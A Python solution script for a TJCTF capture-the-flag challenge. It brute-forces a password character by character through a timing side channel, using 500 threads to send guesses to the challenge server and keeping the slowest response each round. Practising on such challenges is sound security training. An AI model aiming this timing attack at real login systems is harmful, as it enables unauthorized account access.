#!/usr/bin/env python3
import socket
import time
import string
from multiprocessing.pool import ThreadPool


def time_attempt(payload):
    s = socket.socket()
    s.connect(('problem1.tjctf.org', 8003))

    start = 0
    end = 0
    while True:
        data = s.recv(4096).decode().strip()
        if not data:
            break

        if 'check each character of your password?' in data:
            checks = 5000000 * 0.25
            checks = str(int(checks)).encode()
            s.send(checks + b'\n')
            continue

        if 'Please enter your password:' in data:
            start = time.time()
            s.send(payload.encode() + b'zzz\n')
            continue

        if 'Authorization failed!' in data:
            end = time.time()
            break

        print("Received:", data)

        if 'tjctf{' in data:
            quit()

    elapsed = end - start
    return (payload, round(elapsed, 1))


def bruteforce():
    prepend = 'TkVWM3IgZ29OTjQgRzF2MyB5MHUgdV'
    correct = 0

    print("Starting bruteforce")

    while '}' not in prepend:
        pool = ThreadPool(processes=500)
        results = []

        # append new chars
        for ch in string.printable:
            async_result = pool.apply_async(time_attempt, (prepend + ch,))
            results.append(async_result)
        # wait until all done
        pool.close()
        # pool.join()

        # collate the results
        results = list(map(lambda r: r.get(), results))

        # get the only correct result
        # results = list(filter(lambda r: r[1] > correct, results))
        max_time = max(results, key=lambda x: x[1])[1]
        results = list(filter(lambda r: r[1] == max_time, results))

        assert len(results) == 1, results
        results = results[0]

        # save the result
        prepend = results[0]  # payload
        correct = results[1]  # time
        print(correct, prepend)

    print('Done:')
    print(prepend)


if __name__ == '__main__':
    bruteforce()
